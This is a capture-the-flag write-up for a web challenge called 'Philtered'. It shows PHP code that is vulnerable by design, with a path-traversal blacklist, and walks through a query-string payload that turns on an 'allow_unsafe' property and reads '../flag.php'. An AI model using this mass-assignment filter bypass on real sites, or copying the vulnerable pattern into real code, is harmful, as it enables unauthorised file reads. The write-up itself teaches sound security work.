---
layout: writeup
title: Philtered
tags: WebX
excerpt: "Can you phigure this one out?"
---

## Description

Dear Raahguu,

Can you phigure this one out?

Regards,
sidd.sh

And then you also got the backend code for the website

## Solution

The Descrption didn't give us much to go off, so we started off by looking through the source code. The only important part you need to know is the index.php file

```php
<?php

class Config {
    public $path = 'information.txt';
    public $data_folder = 'data/';
}

class FileLoader {
    public $config;
    // idk if we would need to load files from other directories or nested directories, but better to keep it flexible if I change my mind later
    public $allow_unsafe = false;
    // These terms will be philtered out to prevent unsafe file access
    public $blacklist = ['php', 'filter', 'flag', '..', 'etc', '/', '\\'];

    public function __construct() {
        $this->config = new Config();
    }

    public function contains_blacklisted_term($value) {
        if (!$this->allow_unsafe) {
            foreach ($this->blacklist as $term) {
                if (stripos($value, $term) !== false) {
                    return true;
                }
            }
        }
        return false;
    }

    public function assign_props($input) {
        foreach ($input as $key => $value) {
            if (is_array($value) && isset($this->$key)) {
                foreach ($value as $subKey => $subValue) {
                    if (property_exists($this->$key, $subKey)) {
                        if ($this->contains_blacklisted_term($subValue)) {
                            $subValue = 'philtered.txt'; // Default to a safe file if blacklisted term is found
                        }
                        $this->$key->$subKey = $subValue;
                    }
                }
            } else if (property_exists($this, $key)) {
                if ($this->contains_blacklisted_term($value)) {
                    $value = 'philtered.txt'; // Default to a safe file if blacklisted term is found
                }
                $this->$key = $value;
            }
        }
    }

    public function load() {
        return file_get_contents($this->config->data_folder . $this->config->path);
    }
}

// Such elegance
$loader = new FileLoader();
$loader->assign_props($_GET);

require_once __DIR__ . '/layout.php';

$content = <<<HTML
<nav style="margin-bottom:2em;">
    <a href="index.php">Home</a> |
    <a href="aboutus.php">About Us</a> |
    <a href="contact.php">Contact</a> |
    <a href="gallery.php">Gallery</a>
</nav>
<h2>Welcome to Philtered</h2>
HTML;

$content .= "<p>" . $loader->load() . "</p>";

$content .= "<h3>About Us</h3>";
$loader->config->path = 'aboutus.txt';
$content .= "<p>" . $loader->load() . "</p>";

$content .= "<h3>Our Values</h3>";
$loader->config->path = 'our-values.txt';
$content .= "<p>" . $loader->load() . "</p>";

$content .= <<<HTML
<h3>Contact</h3>
<ul>
    <li>Email: info</li>
    <li>Please don't talk to us, we don't like it</li>
</ul>
HTML;

render_layout('Philtered - Home', $content);
?>
```

Other then thhat you need to know that at the same directory level as `index.php` existed `flag.php` which contained the code:

```php
<?php $flag = 'DUCTF{TEST_FLAG}'; ?>
```

As the `flag.php` code just sets a variable server side, navigating to it directly returns nothing, so we instead need to find some way to read the file or to execute it and then later print out the `$flag` variable

Luckily in index.php the get request specifies what file to load the data from in the `load` method.

```php
public function load() {
	return file_get_contents($this->config->data_folder . $this->config->path);
}
```

The only problem with just reading out the `flag.php` file, is that the request is filtered and so the strings `php, :, .., /, \\, filter, flag, etc` are not allowed as long as `allow_unsafe` is turned false.

An example of how this should be used is:

`https://web-philtered-0a2005e5b9bf.2025.ductf.net/?config[path]=our-values.txt`

![picture of the website showing how we caused the our-values.txt file to be read and loaded onto the page due to the command](/assets/images/writeups_images/Philtered/1.png)

This shows how due to the three lines in the php:

```php
$loader = new FileLoader();
$loader->assign_props($_GET);
...
$content .= "<p>" . $loader->load() . "</p>";
```

we can insert text from whatever file we want on the server.

Trying to go straight for the flag we get

`https://web-philtered-0a2005e5b9bf.2025.ductf.net/?config[path]=../flag.php`

![picture of the website showing how instead of reading out flag.php, we got the text `You've just been philtered!`](/assets/images/writeups_images/Philtered/2.png)

This just has the text `You've just been philtered` Note: that text is the contents of the `data/philtered.txt`

This file has been read instead of the flag because we tripped the filter code:

```php
// These terms will be philtered out to prevent unsafe file access
    public $blacklist = ['php', 'filter', 'flag', '..', 'etc', '/', '\\'];

	...

    public function contains_blacklisted_term($value) {
        if (!$this->allow_unsafe) {
            foreach ($this->blacklist as $term) {
                if (stripos($value, $term) !== false) {
                    return true;
                }
            }
        }
        return false;
    }
```

So we need to get around the filter before we can even load the `flag.php` file. Luckily, the filter checks if the FileLoader instance calling it has the attribute `allow_unsage` set to false before filtering. Luckily though, due to how the `assign_props` method that we used to allows us to set `config[path]` we can also set `allow_unsafe`

So by just adding `allow_unsafe=true` into the query, we can now go to whatever file we want, so lets do that. Warning, due to the interprative nature of how `assign_props` works, you need to define `allow_unsafe` before you set the path, or you will still be filtered.

`https://web-philtered-0a2005e5b9bf.2025.ductf.net/?allow_unsafe=true&config[path]=../flag.php`


![picture of the website showing their being nothing in the area where we control the content](/assets/images/writeups_images/Philtered/3.png)


The website should be loading in `flag.php` yet nothing is there. This is becuase the `flag.php` file is being loaded in, but as it isn't actual html code or normal text, it is instead being loaded in as a comment, so by viewing the html code you can see

```html
...
<h2>Welcome to Philtered</h2>
<p>
	<!--?php $flag = 'DUCTF{h0w_d0_y0u_l1k3_y0ur_ph1lters?}'; ?-->
</p>
<h3>About Us</h3>
...
```

And there the flag is `DUCTF{h0w_d0_y0u_l1k3_y0ur_ph1lters?}`
